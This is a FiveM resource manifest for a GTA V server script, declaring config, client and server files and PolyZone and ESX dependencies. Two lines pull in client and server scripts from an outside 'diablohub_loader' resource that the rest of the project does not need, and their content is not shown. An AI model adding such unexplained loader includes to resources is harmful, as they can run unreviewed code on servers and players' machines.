fx_version "bodacious"
game "gta5"
lua54 "yes"
shared_scripts {
    "config.lua"
}
client_scripts {
	"@PolyZone/client.lua",
	"@PolyZone/BoxZone.lua",
	"@PolyZone/EntityZone.lua",
	"@PolyZone/CircleZone.lua",
	"@PolyZone/ComboZone.lua",
}
server_scripts {
	"server.lua"
}
client_script "@diablohub_loader/c_loader.lua"
server_script "@diablohub_loader/s_loader.lua"
my_data "client_files" { "client.lua" }
shared_script '@es_extended/imports.lua'